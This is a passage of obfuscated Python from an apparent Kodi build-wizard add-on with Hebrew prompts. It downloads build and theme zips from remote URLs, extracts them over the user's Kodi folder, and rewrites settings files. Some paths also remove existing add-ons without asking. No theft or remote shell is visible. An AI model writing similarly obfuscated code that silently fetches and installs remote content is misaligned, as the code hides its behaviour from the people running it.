			O0OO0O00O0OOO000O .close ()#line:3857
		except :#line:3858
				pass #line:3859
		wiz .kodi17Fix ()#line:3860
		O0O000OO0OO00OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3861
		try :#line:3862
			O0OO0O00O0OOO000O =open (O0O000OO0OO00OO0O ,'r')#line:3863
			OOOO0O0O0000O000O =O0OO0O00O0OOO000O .read ()#line:3864
			O0OO0O00O0OOO000O .close ()#line:3865
			O00OO0O00OO000O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3866
			OOO000O00O0O0O000 =re .compile (O00OO0O00OO000O00 ).findall (OOOO0O0O0000O000O )[0 ]#line:3867
			O0OO0O00O0OOO000O =open (O0O000OO0OO00OO0O ,'w')#line:3868
			O0OO0O00O0OOO000O .write (OOOO0O0O0000O000O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OOO000O00O0O0O000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3869
			O0OO0O00O0OOO000O .close ()#line:3870
		except :#line:3871
				pass #line:3872
		swapSkins ('skin.Premium.mod')#line:3873
def buildWizard (O0OO00O0O00O000O0 ,OO0OOOO00OOO0OO0O ,theme =None ,over =False ):#line:3876
	if over ==False :#line:3877
		OOO0O000OO0OO0O0O =wiz .checkBuild (O0OO00O0O00O000O0 ,'url')#line:3878
		if OOO0O000OO0OO0O0O ==False :#line:3880
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3885
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3886
			return #line:3887
		OO0O0OO00OOO00OO0 =wiz .workingURL (OOO0O000OO0OO0O0O )#line:3888
		if OO0O0OO00OOO00OO0 ==False :#line:3889
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,OO0O0OO00OOO00OO0 ))#line:3890
			return #line:3891
	if OO0OOOO00OOO0OO0O =='gui':#line:3892
		if O0OO00O0O00O000O0 ==BUILDNAME :#line:3893
			if over ==True :O0OOO0OO0OO00OOO0 =1 #line:3894
			else :O0OOO0OO0OO00OOO0 =1 #line:3895
		else :#line:3896
			O0OOO0OO0OO00OOO0 =1 #line:3897
		if O0OOO0OO0OO00OOO0 :#line:3898
			remove_addons ()#line:3899
			remove_addons2 ()#line:3900
			O0OO00O000O0O0OO0 =wiz .checkBuild (O0OO00O0O00O000O0 ,'gui')#line:3901
			O000000OOOOO0000O =O0OO00O0O00O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3902
			if not wiz .workingURL (O0OO00O000O0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3903
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3904
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ),'','אנא המתן')#line:3905
			O00OOO0000O0O0O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000000OOOOO0000O )#line:3906
			try :os .remove (O00OOO0000O0O0O0O )#line:3907
			except :pass #line:3908
			logging .warning (O0OO00O000O0O0OO0 )#line:3909
			if 'google'in O0OO00O000O0O0OO0 :#line:3910
			   O00OO0O00OO0O00OO =googledrive_download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP ,wiz .checkBuild (O0OO00O0O00O000O0 ,'filesize'))#line:3911
			else :#line:3914
			  downloader .download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP )#line:3915
			xbmc .sleep (100 )#line:3916
			O0O00OOO0OO00OOO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 )#line:3917
			DP .update (0 ,O0O00OOO0OO00OOO0 ,'','אנא המתן')#line:3918
			extract .all (O00OOO0000O0O0O0O ,HOME ,DP ,title =O0O00OOO0OO00OOO0 )#line:3919
			DP .close ()#line:3920
			wiz .defaultSkin ()#line:3921
			wiz .lookandFeelData ('save')#line:3922
			wiz .kodi17Fix ()#line:3923
			if KODIV >=18 :#line:3924
				skindialogsettind18 ()#line:3925
			xbmc .executebuiltin ("ReloadSkin()")#line:3926
			if INSTALLMETHOD ==1 :O0O00O0000000O000 =1 #line:3927
			elif INSTALLMETHOD ==2 :O0O00O0000000O000 =0 #line:3928
			else :DP .close ()#line:3929
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3930
			update_Votes ()#line:3931
			indicatorfastupdate ()#line:3932
		else :#line:3934
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3935
	if OO0OOOO00OOO0OO0O =='gui2':#line:3936
		if O0OO00O0O00O000O0 ==BUILDNAME :#line:3937
			if over ==True :O0OOO0OO0OO00OOO0 =1 #line:3938
			else :O0OOO0OO0OO00OOO0 =1 #line:3939
		else :#line:3940
			O0OOO0OO0OO00OOO0 =1 #line:3941
		if O0OOO0OO0OO00OOO0 :#line:3942
			remove_addons ()#line:3943
			remove_addons2 ()#line:3944
			O0OO00O000O0O0OO0 =wiz .checkBuild (O0OO00O0O00O000O0 ,'gui')#line:3945
			O000000OOOOO0000O =O0OO00O0O00O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3946
			if not wiz .workingURL (O0OO00O000O0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3947
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3948
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ),'','אנא המתן')#line:3949
			O00OOO0000O0O0O0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000000OOOOO0000O )#line:3950
			try :os .remove (O00OOO0000O0O0O0O )#line:3951
			except :pass #line:3952
			logging .warning (O0OO00O000O0O0OO0 )#line:3953
			if 'google'in O0OO00O000O0O0OO0 :#line:3954
			   O00OO0O00OO0O00OO =googledrive_download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP ,wiz .checkBuild (O0OO00O0O00O000O0 ,'filesize'))#line:3955
			else :#line:3958
			  downloader .download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP )#line:3959
			xbmc .sleep (100 )#line:3960
			O0O00OOO0OO00OOO0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 )#line:3961
			DP .update (0 ,O0O00OOO0OO00OOO0 ,'','אנא המתן')#line:3962
			extract .all (O00OOO0000O0O0O0O ,HOME ,DP ,title =O0O00OOO0OO00OOO0 )#line:3963
			DP .close ()#line:3964
			wiz .defaultSkin ()#line:3965
			wiz .lookandFeelData ('save')#line:3966
			if INSTALLMETHOD ==1 :O0O00O0000000O000 =1 #line:3969
			elif INSTALLMETHOD ==2 :O0O00O0000000O000 =0 #line:3970
			else :DP .close ()#line:3971
		else :#line:3973
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3974
	elif OO0OOOO00OOO0OO0O =='fresh':#line:3975
		freshStart (O0OO00O0O00O000O0 )#line:3976
	elif OO0OOOO00OOO0OO0O =='normal':#line:3977
		if url =='normal':#line:3978
			if KEEPTRAKT =='true':#line:3979
				traktit .autoUpdate ('all')#line:3980
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3981
			if KEEPREAL =='true':#line:3982
				debridit .autoUpdate ('all')#line:3983
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3984
			if KEEPLOGIN =='true':#line:3985
				loginit .autoUpdate ('all')#line:3986
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3987
		O000OO00OOO0OO0O0 =int (KODIV );O00O0OOO0O0000OO0 =int (float (wiz .checkBuild (O0OO00O0O00O000O0 ,'kodi')))#line:3988
		if not O000OO00OOO0OO0O0 ==O00O0OOO0O0000OO0 :#line:3989
			if O000OO00OOO0OO0O0 ==16 and O00O0OOO0O0000OO0 <=15 :OOO0OOO0O0000OOOO =False #line:3990
			else :OOO0OOO0O0000OOOO =True #line:3991
		else :OOO0OOO0O0000OOOO =False #line:3992
		if OOO0OOO0O0000OOOO ==True :#line:3993
			OO0OO00O0O0OOOO00 =1 #line:3994
		else :#line:3995
			if not over ==False :OO0OO00O0O0OOOO00 =1 #line:3996
			else :OO0OO00O0O0OOOO00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3997
		if OO0OO00O0O0OOOO00 :#line:3998
			wiz .clearS ('build')#line:3999
			O0OO00O000O0O0OO0 =wiz .checkBuild (O0OO00O0O00O000O0 ,'url')#line:4000
			O000000OOOOO0000O =O0OO00O0O00O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4001
			if not wiz .workingURL (O0OO00O000O0O0OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4002
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4003
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ,wiz .checkBuild (O0OO00O0O00O000O0 ,'version')),'','אנא המתן')#line:4004
			O00OOO0000O0O0O0O =os .path .join (PACKAGES ,'%s.zip'%O000000OOOOO0000O )#line:4005
			try :os .remove (O00OOO0000O0O0O0O )#line:4006
			except :pass #line:4007
			logging .warning (O0OO00O000O0O0OO0 )#line:4008
			if 'google'in O0OO00O000O0O0OO0 :#line:4009
			   O00OO0O00OO0O00OO =googledrive_download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP ,wiz .checkBuild (O0OO00O0O00O000O0 ,'filesize'))#line:4010
			else :#line:4013
			  downloader .download (O0OO00O000O0O0OO0 ,O00OOO0000O0O0O0O ,DP )#line:4014
			xbmc .sleep (1000 )#line:4015
			O0O00OOO0OO00OOO0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ,wiz .checkBuild (O0OO00O0O00O000O0 ,'version'))#line:4016
			DP .update (0 ,O0O00OOO0OO00OOO0 ,'','Please Wait')#line:4017
			O0O000OOO0000O00O ,OOOOOO00OO000OOO0 ,O000O0O00OOO0OO00 =extract .all (O00OOO0000O0O0O0O ,HOME ,DP ,title =O0O00OOO0OO00OOO0 )#line:4018
			if int (float (O0O000OOO0000O00O ))>0 :#line:4019
				try :#line:4020
					wiz .fixmetas ()#line:4021
				except :pass #line:4022
				wiz .lookandFeelData ('save')#line:4023
				wiz .defaultSkin ()#line:4024
				wiz .setS ('buildname',O0OO00O0O00O000O0 )#line:4026
				wiz .setS ('buildversion',wiz .checkBuild (O0OO00O0O00O000O0 ,'version'))#line:4027
				wiz .setS ('buildtheme','')#line:4028
				wiz .setS ('latestversion',wiz .checkBuild (O0OO00O0O00O000O0 ,'version'))#line:4029
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4030
				wiz .setS ('installed','true')#line:4031
				wiz .setS ('extract',str (O0O000OOO0000O00O ))#line:4032
				wiz .setS ('errors',str (OOOOOO00OO000OOO0 ))#line:4033
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0O000OOO0000O00O ,OOOOOO00OO000OOO0 ))#line:4034
				O00O0OO00O0OOO0OO =(ADDON .getSetting ("gaiaseren"))#line:4036
				if O00O0OO00O0OOO0OO =='true':#line:4037
					wiz .kodi17Fix ()#line:4038
				fastupdatefirstbuild (NOTEID )#line:4039
				skin_homeselect ()#line:4040
				skin_lower ()#line:4041
				rdbuildinstall ()#line:4042
				try :gaiaserenaddon ()#line:4044
				except :pass #line:4045
				adults18 ()#line:4046
				skinfix18 ()#line:4047
				try :os .remove (O00OOO0000O0O0O0O )#line:4049
				except :pass #line:4050
				if O00O0OO00O0OOO0OO =='true':#line:4051
					wiz .kodi17Fix ()#line:4052
				O0O000O0O0O0O0O0O =(ADDON .getSetting ("auto_rd"))#line:4053
				if O0O000O0O0O0O0O0O =='true':#line:4054
					try :#line:4055
						setautorealdebrid ()#line:4056
					except :pass #line:4057
				try :#line:4058
					autotrakt ()#line:4059
				except :pass #line:4060
				OOOO0OOOO000O0O0O =(ADDON .getSetting ("imdb_on"))#line:4061
				if OOOO0OOOO000O0O0O =='true':#line:4062
					imdb_synck ()#line:4063
				iptvset ()#line:4064
				if int (float (OOOOOO00OO000OOO0 ))>0 :#line:4066
					O0OOO0OO0OO00OOO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ,wiz .checkBuild (O0OO00O0O00O000O0 ,'version')),'הושלם: [COLOR %s]%s%s[/COLOR] [שגיאות:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O000OOO0000O00O ,'%',COLOR1 ,OOOOOO00OO000OOO0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4067
					if O0OOO0OO0OO00OOO0 :#line:4068
						if isinstance (OOOOOO00OO000OOO0 ,unicode ):#line:4069
							O000O0O00OOO0OO00 =O000O0O00OOO0OO00 .encode ('utf-8')#line:4070
						wiz .TextBox (ADDONTITLE ,O000O0O00OOO0OO00 )#line:4071
				DP .close ()#line:4072
				O000OO0000OO00OO0 =wiz .themeCount (O0OO00O0O00O000O0 )#line:4073
				builde_Votes ()#line:4074
				indicator ()#line:4075
				if not O000OO0000OO00OO0 ==False :#line:4076
					buildWizard (O0OO00O0O00O000O0 ,'theme')#line:4077
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4078
				if INSTALLMETHOD ==1 :O0O00O0000000O000 =1 #line:4079
				elif INSTALLMETHOD ==2 :O0O00O0000000O000 =0 #line:4080
				else :resetkodi ()#line:4081
				if O0O00O0000000O000 ==1 :wiz .reloadFix ()#line:4083
				else :wiz .killxbmc (True )#line:4084
			else :#line:4085
				if isinstance (OOOOOO00OO000OOO0 ,unicode ):#line:4086
					O000O0O00OOO0OO00 =O000O0O00OOO0OO00 .encode ('utf-8')#line:4087
				O0OO0O0O0OOOOO0O0 =open (O00OOO0000O0O0O0O ,'r')#line:4088
				O0OO0OO000OO0OOO0 =O0OO0O0O0OOOOO0O0 .read ()#line:4089
				OOOO0O0OOOO0OOOOO =''#line:4090
				for OO0OO000O00OOOO0O in O00OO0O00OO0O00OO :#line:4091
				  OOOO0O0OOOO0OOOOO ='key: '+OOOO0O0OOOO0OOOOO +'\n'+OO0OO000O00OOOO0O #line:4092
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O000O0O00OOO0OO00 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOO0O0OOOO0OOOOO )#line:4093
		else :#line:4094
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4095
	elif OO0OOOO00OOO0OO0O =='theme':#line:4096
		if theme ==None :#line:4097
			O000OO0000OO00OO0 =wiz .checkBuild (O0OO00O0O00O000O0 ,'theme')#line:4098
			O00O0O0O000O0OO0O =[]#line:4099
			if not O000OO0000OO00OO0 =='http://'and wiz .workingURL (O000OO0000OO00OO0 )==True :#line:4100
				O00O0O0O000O0OO0O =wiz .themeCount (O0OO00O0O00O000O0 ,False )#line:4101
				if len (O00O0O0O000O0OO0O )>0 :#line:4102
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,O0OO00O0O00O000O0 ,COLOR1 ,len (O00O0O0O000O0OO0O )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4103
						wiz .log ("Theme List: %s "%str (O00O0O0O000O0OO0O ))#line:4104
						O0OO0O00000OOOO00 =DIALOG .select (ADDONTITLE ,O00O0O0O000O0OO0O )#line:4105
						wiz .log ("Theme install selected: %s"%O0OO0O00000OOOO00 )#line:4106
						if not O0OO0O00000OOOO00 ==-1 :theme =O00O0O0O000O0OO0O [O0OO0O00000OOOO00 ];OO0O000OOOOOOOO0O =True #line:4107
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4108
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4109
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4110
		else :OO0O000OOOOOOOO0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0OO00O0O00O000O0 ,wiz .checkBuild (O0OO00O0O00O000O0 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4111
		if OO0O000OOOOOOOO0O :#line:4112
			O0O0O000OO0O0OO0O =wiz .checkTheme (O0OO00O0O00O000O0 ,theme ,'url')#line:4113
			O000000OOOOO0000O =O0OO00O0O00O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4114
			if not wiz .workingURL (O0O0O000OO0O0OO0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4115
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4116
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4117
			O00OOO0000O0O0O0O =os .path .join (PACKAGES ,'%s.zip'%O000000OOOOO0000O )#line:4118
			try :os .remove (O00OOO0000O0O0O0O )#line:4119
			except :pass #line:4120
			downloader .download (O0O0O000OO0O0OO0O ,O00OOO0000O0O0O0O ,DP )#line:4121
			xbmc .sleep (1000 )#line:4122
			DP .update (0 ,"","Installing %s "%O0OO00O0O00O000O0 )#line:4123
			O0OO0O0O0OOOO0OOO =False #line:4124
			if url not in ["fresh","normal"]:#line:4125
				O0OO0O0O0OOOO0OOO =testTheme (O00OOO0000O0O0O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4126
				O0000O0OOOOO00000 =testGui (O00OOO0000O0O0O0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4127
				if O0OO0O0O0OOOO0OOO ==True :#line:4128
					wiz .lookandFeelData ('save')#line:4129
					O0O00O000O00O0OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4130
					OOOOO000O00O0OO0O =xbmc .getSkinDir ()#line:4131
					skinSwitch .swapSkins (O0O00O000O00O0OO0 )#line:4133
					O0O00O00OOO0OOOOO =0 #line:4134
					xbmc .sleep (1000 )#line:4135
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00O00OOO0OOOOO <150 :#line:4136
						O0O00O00OOO0OOOOO +=1 #line:4137
						xbmc .sleep (1000 )#line:4138
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4139
						wiz .ebi ('SendClick(11)')#line:4140
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4141
					xbmc .sleep (1000 )#line:4142
			O0O00OOO0OO00OOO0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4143
			DP .update (0 ,O0O00OOO0OO00OOO0 ,'','אנא המתן')#line:4144
			O0O000OOO0000O00O ,OOOOOO00OO000OOO0 ,O000O0O00OOO0OO00 =extract .all (O00OOO0000O0O0O0O ,HOME ,DP ,title =O0O00OOO0OO00OOO0 )#line:4145
			wiz .setS ('buildtheme',theme )#line:4146
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O0O000OOO0000O00O ,OOOOOO00OO000OOO0 ))#line:4147
			DP .close ()#line:4148
			if url not in ["fresh","normal"]:#line:4149
				wiz .forceUpdate ()#line:4150
				if KODIV >=17 :wiz .kodi17Fix ()#line:4151
				if O0000O0OOOOO00000 ==True :#line:4152
					wiz .lookandFeelData ('save')#line:4153
					wiz .defaultSkin ()#line:4154
					OOOOO000O00O0OO0O =wiz .getS ('defaultskin')#line:4155
					skinSwitch .swapSkins (OOOOO000O00O0OO0O )#line:4156
					O0O00O00OOO0OOOOO =0 #line:4157
					xbmc .sleep (1000 )#line:4158
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00O00OOO0OOOOO <150 :#line:4159
						O0O00O00OOO0OOOOO +=1 #line:4160
						xbmc .sleep (1000 )#line:4161
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4163
						wiz .ebi ('SendClick(11)')#line:4164
					wiz .lookandFeelData ('restore')#line:4165
				elif O0OO0O0O0OOOO0OOO ==True :#line:4166
					skinSwitch .swapSkins (OOOOO000O00O0OO0O )#line:4167
					O0O00O00OOO0OOOOO =0 #line:4168
					xbmc .sleep (1000 )#line:4169
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0O00O00OOO0OOOOO <150 :#line:4170
						O0O00O00OOO0OOOOO +=1 #line:4171
						xbmc .sleep (1000 )#line:4172
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4174
						wiz .ebi ('SendClick(11)')#line:4175
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4176
					wiz .lookandFeelData ('restore')#line:4177
				else :#line:4178
					wiz .ebi ("ReloadSkin()")#line:4179
					xbmc .sleep (1000 )#line:4180
					wiz .ebi ("Container.Refresh")#line:4181
		else :#line:4182
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4183
def skin_homeselect ():#line:4187
	try :#line:4189
		O00OOOOOOO00OO0OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4190
		OO000OO0OOOO0OO00 =open (O00OOOOOOO00OO0OO ,'r')#line:4192
		OO00OOO0O0O0OOOOO =OO000OO0OOOO0OO00 .read ()#line:4193
		OO000OO0OOOO0OO00 .close ()#line:4194
		O0O0000OOOO00O0O0 ='<setting id="HomeS" type="string(.+?)/setting>'#line:4195
		O0O00O0O000OO0O0O =re .compile (O0O0000OOOO00O0O0 ).findall (OO00OOO0O0O0OOOOO )[0 ]#line:4196
		OO000OO0OOOO0OO00 =open (O00OOOOOOO00OO0OO ,'w')#line:4197
		OO000OO0OOOO0OO00 .write (OO00OOO0O0O0OOOOO .replace ('<setting id="HomeS" type="string%s/setting>'%O0O00O0O000OO0O0O ,'<setting id="HomeS" type="string"></setting>'))#line:4198
		OO000OO0OOOO0OO00 .close ()#line:4199
	except :#line:4200
		pass #line:4201
def skin_lower ():#line:4204
	OOO0000OOO00O0O0O =(ADDON .getSetting ("lower"))#line:4205
	if OOO0000OOO00O0O0O =='true':#line:4206
		try :#line:4209
			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4210
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4212
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4213
			OOOO0O0000O000O0O .close ()#line:4214
			OO00OO0OO000O00O0 ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4215
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4216
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4217
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="none_widget" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4218
			OOOO0O0000O000O0O .close ()#line:4219
			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4221
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4223
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4224
			OOOO0O0000O000O0O .close ()#line:4225
			OO00OO0OO000O00O0 ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4226
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4227
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4228
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4229
			OOOO0O0000O000O0O .close ()#line:4230
			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4232
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4234
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4235
			OOOO0O0000O000O0O .close ()#line:4236
			OO00OO0OO000O00O0 ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4237
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4238
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4239
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4240
			OOOO0O0000O000O0O .close ()#line:4241
			O000OO000OO00000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4245
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'r')#line:4247
			OO00O0000O0OOO00O =OOOO0O0000O000O0O .read ()#line:4248
			OOOO0O0000O000O0O .close ()#line:4249
			OO00OO0OO000O00O0 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4250
			OOO0O0O00O0000000 =re .compile (OO00OO0OO000O00O0 ).findall (OO00O0000O0OOO00O )[0 ]#line:4251
			OOOO0O0000O000O0O =open (O000OO000OO00000O ,'w')#line:4252
			OOOO0O0000O000O0O .write (OO00O0000O0OOO00O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OOO0O0O00O0000000 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4253
			OOOO0O0000O000O0O .close ()#line:4254
